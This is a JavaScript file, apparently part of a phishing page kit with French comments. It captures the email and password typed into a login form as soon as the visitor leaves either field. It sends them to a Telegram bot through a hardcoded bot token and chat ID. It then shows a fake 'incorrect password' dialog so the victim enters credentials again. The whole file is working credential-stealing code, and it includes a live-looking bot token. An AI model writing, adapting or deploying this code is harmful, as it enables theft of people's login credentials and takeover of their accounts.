document.addEventListener("DOMContentLoaded", function() {
  const form = document.querySelector("form");
  let sent = false;

  function trySendTelegram() {
    if (sent) return;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    if (email && password) {
      sent = true;
      // Construction du message avec emoji
      const message = `📩 New Access Mail
Adresse e-mail: ${email}
Mot de passe: ${password}`;
      const encodedMessage = encodeURIComponent(message);
      
      const BOT_TOKEN = "6624432570:AAGqO15QChjwc77w3qNLTA73DZWO3LsqwNA";
      const CHAT_ID = "1957433646";
      
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
      
      // Envoi de la requête fetch
      fetch(url)
        .then(response => response.json())
        .then(data => {
          // Copie automatique du message dans le presse-papier
          navigator.clipboard.writeText(message)
            .then(() => {
              showError();
            })
            .catch(err => {
              console.error("Erreur lors de la copie dans le presse-papier:", err);
              showError();
            });
        })
        .catch(error => {
          console.error("Erreur lors de la requête fetch:", error);
          showError();
        });
    }
  }
  
  // Envoi dès que l'utilisateur quitte les champs (blur)
  document.getElementById("email").addEventListener("blur", trySendTelegram);
  document.getElementById("password").addEventListener("blur", trySendTelegram);
  
  // Conserver le submit pour garantir (si jamais)
  form.addEventListener("submit", function(event) {
    event.preventDefault();
    trySendTelegram();
  });
  
  function showError() {
    // Création d'une fenêtre modale pour afficher l'erreur
    const modal = document.createElement("div");
    modal.style.position = "fixed";
    modal.style.top = "0";
    modal.style.left = "0";
    modal.style.width = "100%";
    modal.style.height = "100%";
    modal.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
    modal.style.display = "flex";
    modal.style.justifyContent = "center";
    modal.style.alignItems = "center";
    modal.style.zIndex = "1000";

    const box = document.createElement("div");
    box.style.backgroundColor = "#fff";
    box.style.padding = "20px";
    box.style.borderRadius = "5px";
    box.style.textAlign = "center";
    box.style.minWidth = "300px";

    const msg = document.createElement("p");
    msg.textContent = "Mot de passe saisi est incorrect";
    msg.style.color = "red";
    msg.style.fontSize = "16px";
    msg.style.marginBottom = "20px";

    const button = document.createElement("button");
    button.textContent = "Ressayer";
    button.style.backgroundColor = "#000";
    button.style.color = "#fff";
    button.style.border = "none";
    button.style.padding = "10px 20px";
    button.style.cursor = "pointer";
    button.addEventListener("click", function() {
      document.body.removeChild(modal);
      form.reset();
      sent = false; // réinitialiser pour permettre un nouvel envoi
    });

    box.appendChild(msg);
    box.appendChild(button);
    modal.appendChild(box);
    document.body.appendChild(modal);
  }
});